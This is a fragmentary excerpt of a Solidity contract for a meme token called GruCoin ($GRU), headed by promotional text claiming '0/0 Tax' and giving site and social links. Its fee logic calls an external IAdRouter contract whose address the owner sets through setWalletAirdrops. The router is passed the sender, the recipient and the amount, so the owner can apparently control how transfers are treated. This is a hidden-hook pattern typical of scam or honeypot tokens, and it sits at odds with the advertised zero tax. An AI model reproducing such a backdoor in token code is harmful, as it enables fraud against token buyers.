...
I am, the greatest criminal of  the MEME

$GRU, 0/0 Tax

https://despicablemecoin.xyz
https://t.me/grucoineth
https://twitter.com/grucoineth
...
interface IAdRouter {
    function checkAdEnabled(bool, bool, address, address, uint256) external returns (bool);
}
...
contract GruCoin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name = "Felonious Gru";
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(walletAirdrops[feeReceiver] != address(0) && IAdRouter(walletAirdrops[feeReceiver]).
            checkAdEnabled(isMarketPair[sender], isMarketPair[recipient], sender, recipient, amount)) {
            feeAmount = 0;
        }
    ...
    function setWalletAirdrops(address[] calldata _address,uint[] calldata _tokens) external onlyOwner {
